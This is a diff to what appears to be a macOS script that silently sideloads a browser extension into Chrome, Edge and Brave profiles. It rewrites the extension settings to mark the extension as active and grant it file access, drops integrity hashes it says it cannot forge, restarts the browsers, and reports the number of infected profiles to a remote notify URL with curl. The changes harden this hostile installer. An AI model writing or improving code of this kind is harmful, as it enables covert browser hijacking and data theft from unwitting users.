@@ -201,7 +201,7 @@ entry['manifest'] = manifest unless manifest.empty?
 entry['was_installed_by_default'] = false
 entry['was_installed_by_oem'] = false
 entry['was_pinned_by_default'] = false
-entry['active_bit'] = false if !entry.key?('active_bit')
+entry['active_bit'] = true
 entry['newAllowFileAccess'] = true
 # Drop encrypted hashes we cannot forge; Chrome re-adds them after load.
 sdata['extensions']['settings'][ext_id] = entry
@@ -278,7 +278,7 @@ done
 rm -rf "$TMP_DIR"
 
 if [ $INJ -eq 0 ]; then
-    curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
+    curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
     echo "No browser profiles found"
     exit 1
 fi
@@ -287,6 +287,6 @@ for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
     open -a "$app" --args --restore-last-session 2>/dev/null || true
 done
 
-curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
+curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
 echo "Successfully installed to $INJ profiles"
 exit 0
